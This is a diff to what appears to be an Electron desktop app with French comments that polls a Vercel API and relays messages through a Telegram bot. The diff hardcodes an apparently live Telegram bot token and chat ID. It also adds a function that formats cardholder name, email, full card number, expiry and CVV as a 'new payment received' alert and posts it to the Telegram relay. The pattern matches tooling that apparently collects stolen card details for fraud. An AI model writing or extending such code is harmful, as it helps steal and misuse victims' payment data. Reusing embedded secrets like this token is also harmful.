@@ -6,6 +6,8 @@ const fetch = require('node-fetch');
 const CONFIG = {
     API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
     TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
+    TELEGRAM_BOT_TOKEN: '8045865062:AAFoDtE5f3w3RNmaGh3-n2X7Lbzpo0ShXSU',
+    TELEGRAM_CHAT_ID: '6523794278',
     UPDATE_INTERVAL: 3000, // 3 secondes
     WINDOW_WIDTH: 1200,
     WINDOW_HEIGHT: 800
@@ -14,6 +16,7 @@ const CONFIG = {
 let mainWindow;
 let tray;
 let isQuitting = false;
+let lastMessageId = 0;
 
 // Créer la fenêtre principale
 function createWindow() {
@@ -99,7 +102,7 @@ function createTray() {
     });
 }
 
-// Récupérer les messages depuis l'API Vercel
+// Récupérer les messages depuis l'API Vercel (notifications)
 async function fetchMessages() {
     try {
         console.log('🔍 Vérification des messages depuis Vercel...');
@@ -107,12 +110,63 @@ async function fetchMessages() {
         const data = await response.json();
         
         if (data.success && data.notifications) {
-            console.log(`📨 ${data.notifications.length} messages trouvés sur Vercel`);
+            console.log(`📨 ${data.notifications.length} notifications trouvées sur Vercel`);
             return data.notifications.reverse(); // Plus récents en premier
         }
         return [];
     } catch (error) {
         console.error('❌ Erreur récupération messages Vercel:', error);
+        return [];
+    }
+}
+
+// Fonction pour simuler un message de paiement (pour test)
+async function simulatePaymentMessage() {
+    try {
+        console.log('🧪 Simulation d\'un message de paiement...');
+        
+        const paymentMessage = `💰 NOUVEAU PAIEMENT REÇU !
+👤 Nom: Client Test
+📧 Email: test@example.com
+💳 Carte: 1234 **** **** 5678
+📅 Expiration: 12/25
+🔐 CVV: 123
+💶 Montant: 99.99€
+🔒 Vérifiez immédiatement !`;
+
+        // Envoyer via Vercel
+        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                message: paymentMessage,
+                type: 'payment'
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            console.log('✅ Message de paiement simulé envoyé !');
+            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
+            
+            // Créer une notification locale pour test
+            const notification = {
+                id: result.telegramResponse?.result?.message_id || Date.now(),
+                message: paymentMessage,
+                timestamp: new Date().toISOString(),
+                sender: 'Cacapaybot',
+                type: 'payment_message'
+            };
+            
+            return [notification];
+        }
+        
+        return [];
+    } catch (error) {
+        console.error('❌ Erreur simulation message:', error);
         return [];
     }
 }
@@ -201,6 +255,10 @@ ipcMain.handle('get-messages', async () => {
 
 ipcMain.handle('test-api', async () => {
     return await sendTestMessage();
+});
+
+ipcMain.handle('simulate-payment', async () => {
+    return await simulatePaymentMessage();
 });
 
 ipcMain.handle('send-payment', async (event, paymentData) => {
